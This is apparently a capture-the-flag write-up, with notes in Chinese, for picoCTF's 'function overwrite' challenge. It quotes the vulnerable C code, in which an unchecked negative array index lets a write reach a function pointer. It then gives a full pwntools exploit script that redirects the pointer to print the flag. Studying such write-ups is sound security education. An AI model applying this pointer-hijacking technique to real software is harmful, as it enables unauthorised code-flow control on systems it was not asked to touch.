# function overwrite

## Information

### Description

Story telling class 2/2

### Hints

(None)

## Solution

1. Discovery

2. Research
    *如何覆寫記憶體位址
    ```c
        if (num1 < 10)
        {
            fun[num1] += num2;
        }
    ```
    * 覆寫到哪
    ```c
        void easy_checker(char *story, size_t len)
        {
        if (calculate_story_score(story, len) == 1337)
        {
            char buf[FLAGSIZE] = {0};
            FILE *f = fopen("flag.txt", "r");
            if (f == NULL)
            {
            printf("%s %s", "Please create 'flag.txt' in this directory with your",
                            "own debugging flag.\n");
            exit(0);
            }

            fgets(buf, FLAGSIZE, f); // size bound read
            printf("You're 1337. Here's the flag.\n");
            printf("%s\n", buf);
        }
        else
        {
            printf("You've failed this class.");
        }
        }

        void hard_checker(char *story, size_t len)
        {
        if (calculate_story_score(story, len) == 13371337)
        {
            char buf[FLAGSIZE] = {0};
            FILE *f = fopen("flag.txt", "r");
            if (f == NULL)
            {
            printf("%s %s", "Please create 'flag.txt' in this directory with your",
                            "own debugging flag.\n");
            exit(0);
            }

            fgets(buf, FLAGSIZE, f); // size bound read
            printf("You're 13371337. Here's the flag.\n");
            printf("%s\n", buf);
        }
        else
        {
            printf("You've failed this class.");
        }
        }

        void (*check)(char*, size_t) = hard_checker;
        int fun[10] = {0};
    ```
3. Exploitation
    ```py
        #! /usr/bin/env python

        from pwn import *

        context(arch='i386', os='linux')

        # nc saturn.picoctf.net 61499
        p = remote(host='saturn.picoctf.net', port=61499)

        # payload
        # variables
        check_addr = 0x0804c040
        fun_addr = 0x0804c080
        var_offset = int((check_addr-fun_addr)/4)

        # function 
        hard_checker_addr = 0x8049436
        easy_checker_addr = 0x80492fc
        easy_checker__nocmp_addr = 0x0804932b
        fun_offset = easy_checker_addr - hard_checker_addr

        success("var offset = %s \nfun offset = %s", var_offset, fun_offset)


        # method 1 
        p.sendlineafter(b'>>', b'abcdefghijklk')    # b'abcdefghijklk' = 1337
        p.sendlineafter(b'10.', str(var_offset))
        p.sendline(str(fun_offset))
        log.info(p.recvall())

        """
        # method 2
        p.sendlineafter(b'>>', b'GiveMeFlag')    # b'abcdefghijklk' = 1337
        p.sendlineafter(b'10.', str(var_offset))

        fun_offset =  easy_checker__nocmp_addr - hard_checker_addr

        p.sendline(str(fun_offset))
        log.info(p.recvall())
        """
    ```